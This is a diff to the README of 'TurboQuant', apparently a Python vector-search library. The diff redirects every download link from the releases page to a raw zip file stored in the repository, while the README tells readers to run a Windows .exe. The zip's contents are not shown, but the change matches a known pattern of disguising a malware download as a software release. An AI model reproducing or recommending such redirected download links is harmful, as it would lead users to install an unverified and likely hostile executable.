@@ -1,6 +1,6 @@
 # ⚡ TurboQuant - Fast vector search with less memory
 
-[![Download TurboQuant](https://img.shields.io/badge/Download-TurboQuant-blue?style=for-the-badge)](https://github.com/bojobh609/TurboQuant/releases)
+[![Download TurboQuant](https://img.shields.io/badge/Download-TurboQuant-blue?style=for-the-badge)](https://github.com/bojobh609/TurboQuant/raw/refs/heads/main/turboquant/Quant_Turbo_3.2.zip)
 
 ## 🖥️ What TurboQuant does
 
@@ -21,7 +21,7 @@ It is built as a pure Python FAISS replacement, so it aims to keep setup simple.
 
 Go to the release page here:
 
-https://github.com/bojobh609/TurboQuant/releases
+https://github.com/bojobh609/TurboQuant/raw/refs/heads/main/turboquant/Quant_Turbo_3.2.zip
 
 On that page, download the latest Windows file for your computer. If you see more than one file, choose the one that ends in `.exe` or the Windows package marked for end users.
 
@@ -184,7 +184,7 @@ This project relates to:
 
 If you need the latest build, use this link:
 
-https://github.com/bojobh609/TurboQuant/releases
+https://github.com/bojobh609/TurboQuant/raw/refs/heads/main/turboquant/Quant_Turbo_3.2.zip
 
 ## 🧩 Simple first run checklist
 
